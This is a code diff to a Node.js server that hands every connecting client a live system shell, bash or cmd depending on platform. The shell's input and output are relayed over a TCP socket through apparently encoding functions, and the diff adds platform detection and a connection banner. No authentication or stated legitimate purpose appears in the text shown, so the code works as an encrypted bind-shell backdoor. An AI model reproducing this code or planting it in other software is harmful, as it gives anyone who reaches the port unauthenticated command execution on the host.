@@ -19,16 +19,29 @@ function translate_in(ciphertext){
 }
 
 const server = createServer((socket) => {
-    
 
-    const shell = spawn("cmd")
+    let shellcmd = undefined
+    switch(process.platform){
+        case "linux":
+            shellcmd = "bash"
+            break
+        case "android":
+            shellcmd = "bash"
+            break
+        case "win32":
+            shellcmd = "cmd"
+            break
+    }
+
+    const shell = spawn(shellcmd)
     console.log("INFO:client connected")
+    socket.write(translate_out("Connected to remote host"))
 
     // shell stdout to client
     shell.stdout.on("data", (data) => {
         socket.write(translate_out(data))
     })
-    
+
     shell.stderr.on("data", (error) => {
         socket.write(translate_out(error))
     })
@@ -45,7 +58,7 @@ const server = createServer((socket) => {
     socket.on("error", (err) => {
         console.log(`ERROR:${err}`)
     })
-    
+
     socket.on("end", () => {
         console.log("INFO:client disconnected")
     })
@@ -57,6 +70,6 @@ const config = {
     exclusive: true
 }
 
-server.listen(config, () => { 
+server.listen(config, () => {
     console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
 });
